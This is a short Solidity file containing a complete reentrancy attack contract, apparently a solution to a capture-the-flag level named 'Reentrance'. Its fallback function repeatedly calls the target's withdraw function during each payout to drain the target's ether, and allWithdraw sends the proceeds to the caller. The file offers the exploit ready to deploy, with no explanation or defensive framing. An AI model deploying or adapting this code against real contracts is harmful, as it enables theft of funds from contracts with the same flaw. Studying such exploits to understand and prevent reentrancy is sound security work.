pragma solidity ^0.5.0;

interface Reentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256 balance);
    function withdraw(uint256 _amount) external;
}

contract ReentranceHack {
    address ca;
    Reentrance re;
    uint256 hackAmount;

    constructor(address deployAddress, uint256 amount) public {
        re = Reentrance(deployAddress);
        ca = deployAddress;
        hackAmount = amount;
    }

    function() external payable {
        bytes memory payload = abi.encodeWithSignature(
            "withdraw(uint256)",
            hackAmount
        );
        (bool success, ) = address(ca).call(payload);
        require(success);
    }

    function donate(address _to) public payable {
        re.donate.value(msg.value)(_to);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return re.balanceOf(_who);
    }

    function withdraw(uint256 amount) public {
        re.withdraw(amount);
    }

    function allWithdraw() public {
        msg.sender.transfer(address(this).balance);
    }

    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }

}
